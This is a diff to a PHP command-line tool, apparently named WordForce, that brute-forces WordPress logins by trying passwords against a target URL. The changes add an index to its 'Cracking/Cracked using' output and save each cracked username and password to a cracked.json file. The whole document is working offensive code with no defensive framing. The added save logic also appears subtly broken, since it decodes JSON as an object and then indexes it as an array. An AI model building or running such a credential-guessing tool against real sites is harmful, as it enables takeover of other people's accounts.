@@ -3,7 +3,7 @@
  * WordForce CLI
  *
  * @author Fray117
- * @version 0.3.4
+ * @version 0.3.7
  */
 
 include 'wordforce.php';
@@ -49,9 +49,20 @@ switch ($opt) {
 				$cracking = $wf->validate($url, $username, $password);
 
 				if ($cracking) {
-					print 'Cracked using ' . $password . PHP_EOL;
+					print '[' . $key  . '] Cracked using ' . $password . PHP_EOL;
+					if (file_exists('cracked.json')) {
+						$data = json_decode(file_get_contents('cracked.json'));
+						$data['user'][$username] = $password;
+						$json = json_encode($data);
+						file_put_contents('cracked.json', $json, LOCK_EX);
+					} else {
+						$data['user'][$username] = $password;
+						$json = json_encode($data);
+						file_put_contents('cracked.json', $json, LOCK_EX);
+					}
+					exit;
 				} else {
-					print 'Cracking using ' . $password . PHP_EOL;
+					print '[' . $key  . '] Cracking using ' . $password . PHP_EOL;
 				}
 			}
 		}
@@ -69,9 +80,20 @@ switch ($opt) {
 				$cracking = $wpforce->validate($url, $username, $password);
 
 				if ($cracking) {
-					print 'Cracked using ' . $password . PHP_EOL;
+					print '[' . $key  . '] Cracked using ' . $password . PHP_EOL;
+					if (file_exists('cracked.json')) {
+						$data = json_decode(file_get_contents('cracked.json'));
+						$data['user'][$username] = $password;
+						$json = json_encode($data);
+						file_put_contents('cracked.json', $json, LOCK_EX);
+					} else {
+						$data['user'][$username] = $password;
+						$json = json_encode($data);
+						file_put_contents('cracked.json', $json, LOCK_EX);
+					}
+					exit;
 				} else {
-					print 'Cracking using ' . $password . PHP_EOL;
+					print '[' . $key  . '] Cracking using ' . $password . PHP_EOL;
 				}
 			}
 		}
@@ -81,7 +103,7 @@ switch ($opt) {
 	default:
 		print ' __        __            _ _____                  ' . PHP_EOL;
 		print ' \ \      / /__  _ __ __| |  ___|__  _ __ ___ ___ ' . PHP_EOL;
-		print '  \ \ /\ / / _ \| \'__/ _` | |_ / _ \| \'__/ __/ _ ' . PHP_EOL;
+		print '  \ \ /\ / / _ \| \'__/ _` | |_ / _ \| \'__/ __/ _ \ ' . PHP_EOL;
 		print '   \ V  V / (_) | | | (_| |  _| (_) | | | (_|  __/' . PHP_EOL;
 		print '    \_/\_/ \___/|_|  \__,_|_|  \___/|_|  \___\___|' . PHP_EOL;
 		print PHP_EOL;
